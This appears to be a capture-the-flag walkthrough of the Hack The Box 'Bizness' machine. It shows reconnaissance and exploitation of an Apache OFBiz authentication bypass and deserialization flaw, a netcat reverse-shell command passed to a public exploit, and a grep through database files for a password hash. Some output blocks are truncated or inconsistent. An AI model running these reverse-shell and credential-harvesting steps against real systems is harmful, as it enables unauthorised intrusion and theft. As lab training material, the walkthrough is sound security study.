# Initial Reconnaissance: Nmap Scan

Before running any scans, I like to store the target machine's IP address in a file:



This way, I can easily retrieve the IP whenever needed using `$(cat ip)`.
**Let's run the Nmap scan:**

```bash
$ sudo nmap -sS -sV -sC -p- $(cat ip) -oN nmap/bizness.out
```

### Breakdown of the command
- **`-sS`**: TCP SYN scan (half-open scan).
- **`-sV`**: Enable version detection.
- **`-sC`**: Run default Nmap scripts.
- **`-p-`**: Scan all 65535 ports.
- **`$(cat ip)`**: Retrieve the target IP address from the `ip` file.
- **`-oN nmap/permx.out`**: Output results to `nmap/permx.out` in normal format.

### Results
```bash
# Nmap 7.94SVN scan initiated Tue Jul 30 17:32:23 2024 as: nmap -sS -sV -sC -p- -oN nmap/bizness.out 10.129.216.214

The results shows 4 ports are open. 
- **`22/tcp     ssh`** 
- **`80/tcp     http`**
- **`443/tcp    ssl/https`**

We can also see that port 80 is redirecting us to the `bizness.htb` domain. so lets add this to our `/etc/hosts`.

```bash
$ sudo su
$ echo "$(cat ip)    bizness.htb" >> /etc/hosts
$ exit
```

and we can test whether we can reach the domain or not by pinging it.

```bash
$ ping bizness.htb -c 3

# Directory and Subdomain Enumeration

**Having modified our `/etc/hosts` file, we can now conveniently access the target machine's web server by navigating to https://bizness.htb in our web browser. Examining the website, we find limited interactivity, suggesting potential client-side rendering or a static website.**

Since the initial web page doesn't offer much in terms of user input or hidden functionalities, we'll shift our focus to directory enumeration. This technique aims to identify hidden or unlinked directories on the web server that might contain sensitive information.

## Directory Enumeration Reveals OFBiz Logins

>Keep in mind that after visiting the web-page, we get redirected to 443 which is HTTPS. this means to run the Directory Enumeration successfully, we would need to target port 443 instead of 80. 
{: .prompt-warning }

We've now explored the initial web page at https://bizness.htb and discovered it offers limited interaction. To have a better look, we can run dirb to find other directories we might be able to access.

```bash
$ dirb https://bizness.htb

```
Dirb successfully identified several directories on the target web server, including:

- `/accounting/`
- `/ap/` 
- `/ar/` 

## OFBiz on Bizness.htb

Visiting some of these discovered directories redirects us to a login page for OFBiz.

>OFBiz (Open For Business) is an open-source enterprise resource planning (ERP) software suite.

Looking closer at the login page, we noticed a version number listed in the bottom left corner. `Copyright (c) 2001-2024 The Apache Software Foundation. Powered by Apache OFBiz. Release 18.12` With some quick research on this specific OFBIZ version, we discovered a critical vulnerability (CVE-2023-51467 and CVE-2023-49070) reported very recently. This vulnerability allows attackers to bypass authentication and potentially gain unauthorised access to the system, even allowing for a reverse shell!

# Successfully Establishing a Connection
## Exploiting the OFBIZ Vulnerability 
There are plenty of Proof of Concept exploits available on github. doing a quick search took us to a repository caclled [Apache-OFBiz-Authentication-Bypass](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) 

I think this is a very neat exploit to work with as its using a relatively readable python script so that we can understand how the exploit works.

lets have a look at the code.

- **Imports**:
    - `argparse`: This module allows the script to accept command-line arguments, making it more flexible and user-friendly.
    - `requests`: This library simplifies sending HTTP requests and handling responses.
    - `urllib3`: Used here to manage SSL-related warnings and is a part of `requests`.
- **Disabling SSL Warnings**:
    - The line `urllib3.disable_warnings(...)` is used to suppress warnings related to unverified HTTPS requests. This is useful for debugging but should be handled with caution in production due to potential security risks.
- **`validate_url` Function**:
    - This function checks if the URL begins with the correct schema (`http://` or `https://`). It raises a `ValueError` if the schema is invalid, ensuring that users provide a well-formed URL.
- **`scan` Function**:
    - Constructs a target URL specifically for the Apache OFBiz vulnerability check.
    - Sends a GET request to the constructed URL with SSL verification turned off.
    - Analyzes the server's response to determine if it contains the string "PONG," indicating a potential vulnerability.
    - Handles HTTP exceptions, printing a message if an error occurs during the request.
- **`main` Function**:
    - Sets up argument parsing with `argparse` to allow users to specify the URL of the Apache OFBiz instance they want to scan.
    - Validates the provided URL and then proceeds with the scanning process.
- **`if __name__ == "__main__"` Block**:
    - Ensures that the `main()` function is only executed if the script is run directly, not when imported as a module.

```
- **Imports**:
    - The script imports various modules to handle command-line arguments, logging, file operations, subprocess management, encoding, and HTTP requests. Each module serves a specific purpose in executing the script's functionality.
- **SSL Warning Suppression**:
    - `urllib3.disable_warnings()` is used to suppress SSL verification warnings, which can clutter the output. However, this approach reduces security, and SSL verification should be enabled in production environments to prevent Man-In-The-Middle (MITM) attacks.
- **`validate_url` Function**:
    - This function ensures that the provided URL starts with `http://` or `https://`. It raises a `ValueError` if the schema is invalid, preventing further execution with an incorrect URL.
- **`scan` Function**:
    - The script checks if the Apache OFBiz instance responds to a specific ping request endpoint. A response containing "PONG" suggests a potential vulnerability, as the endpoint should not be publicly accessible.
- **`get_encoded_payload` Function**:
    - This function generates a base64-encoded payload using `ysoserial`, a tool for generating payloads that exploit Java deserialization vulnerabilities. It runs a Java command to create a serialized payload, which is then base64-encoded for use in the exploit.
- **`send_post_request` Function**:
    - Sends a POST request to the target server containing the encoded payload. This request attempts to exploit a deserialization vulnerability in the Apache OFBiz instance, potentially executing the provided command on the server.
- **`main` Function**:
    - Sets up command-line argument parsing to allow the user to specify the target URL and an optional command to run. If no command is provided, the script performs a basic scan; otherwise, it attempts to exploit the server using the specified command.
- **Command-Line Arguments**:
    - `--url`: Specifies the target URL for the scan or exploit.
    - `--cmd`: (Optional) Specifies the command to execute on the remote server if the exploit is attempted.




------

## Running the Exploit
to run the exploit we simply need to clone the git repository and run the exploit file. 
Firstly, we can check if the target is vulnerable to this attack by running the following command: 

```bash
$ python exploit.py --url https://bizness.htb
[+] Scanning started ...
[+] Apache OFBiz instance seems to be vulnerable.
```

The outcome indicates that our target is vulnerable to this attack and we are likely to obtain a shell through this. 

To exploit this system to our advantage, we need a listener running..

### Netcat Listener
in order to obtain the shell, we are going to run a reverse shell command. this command essentially establishes the shell by initiating the connection from the targets end instead of our end. we are no longer accessing an available service on the target and asking for a shell, we are forcing the target system to establish a shell with us. to do so we need a listener set up to hear out for the connection. 

I have been experimenting with a python based tool named Penelope however in order to minimise automation in this walk through we will use Netcat as our listener. personally i like Penelope only for its automatic shell upgrade which we will cover after accessing the shell. 

to set up a listener with Netcat, run the following command:

```bash
$ nc -nvlp [port number]
```

### Running the exploit.
to run the exploit, you need the following command:

```bash
$ python exploit.py --url https://bizness.htb --cmd 'nc [your_ip] [port number] -c bash'
```

here you are running python with targets URL and the command you like to run on target system. 
for us this will be a Netcat command to establish a reverse shell with our listener.

once the exploit is executesd, we can check out listener to see if it's received the conneciton.

```bash
$ whoami
ofbiz
```
## Improving Shell Efficiency
As you can see, the shell is so clunky its barely usable, the arrow keys dont work and you cant clear the terminal. chances us changing your terminals window size could break the character alignment and make the text unreadable. to overcome this, we can upgrade our shell on this system using python:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Next, we'll send the shell to the background using Ctrl+Z and run:

```bash
stty raw -echo; fg
```

Now, define our Terminal emulator with:

```bash
export TERM=xterm
```

With these adjustments, our shell becomes more responsive, allowing for easier navigation and command recall.

## User flag

Let's search for the user flag. Typically, it's located in the home directory, making it easy to find. Let's check:

we can do this by listing the home directory with 

```bash
ofbiz@bizness:/opt/ofbiz$ ls ~/
user.txt
```

And there you have it—the user flag is right there, waiting to be discovered.

## Privilege Escalation 
I examined the system using Linpeas and tried several kernel privilege escalation exploits, but didn't have any luck. After some online research, I couldn't find a solution, so I turned to other resources about this box. According to the write-up I found at https://techyrick.com/bizness-hackthebox-writeup/, to escalate your privileges, you need to search through the OFBiz folder where you've landed the shell and find a user password, which is stored in SHA1. There's no easy shortcut—you just have to get familiar with OFBiz.

to find the SHA1 hash, you can use the below command after navigating to the derby database directory.

```bash
cd /opt/ofbiz/runtime/data/derby/ofbiz/seg0/
grep -arin -o -E '(\w+\w){0,5}password(\W+\w){0,5}' .
```

Let's break down the command:

1. `grep`: This is the command-line utility used for searching text patterns in files.
2. `-a`: This flag tells `grep` to treat binary files as text files, allowing it to search through them.
3. `-r`: This flag stands for "recursive", meaning it will search through all files and directories recursively, starting from the current directory (`.`).
4. `-i`: This flag makes the search case-insensitive, so it will match "password", "Password", "PASSWORD", etc.
5. `-n`: This flag tells `grep` to print the line numbers of matching lines along with the lines themselves.
6. `-o`: This flag instructs `grep` to only print the matched parts of a line, rather than the entire line.
7. `-E`: This flag enables extended regular expressions, allowing for more complex pattern matching.
8. `'(\w+\w){0,5}password(\W+\w){0,5}'`: This is the pattern we're searching for. Let's break it down further:
   - `(\w+\w)`: This part matches one or more word characters (alphanumeric characters plus underscore), repeated twice. This allows for matching words like "admin123" or "user_567".
   - `{0,5}`: This quantifier specifies that the preceding pattern should be repeated between 0 and 5 times. So, `(pattern){0,5}` matches from 0 to 5 occurrences of the pattern.
   - `password`: This is the literal string "password" that we're searching for.
   - `(\W+\w)`: This part matches one or more non-word characters (anything other than alphanumeric characters or underscore) followed by one or more word characters, repeated once. This allows for matching strings like "password123!" or "password_abc".
   - `{0,5}`: Similar to before, this quantifier specifies that the preceding pattern should be repeated between 0 and 5 times.
9. `.`: This specifies the directory to search in. In this case, it's the current directory (`.`).

and if we look through the file we can see below:

```bash
./c54d0.dat:21:password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
```
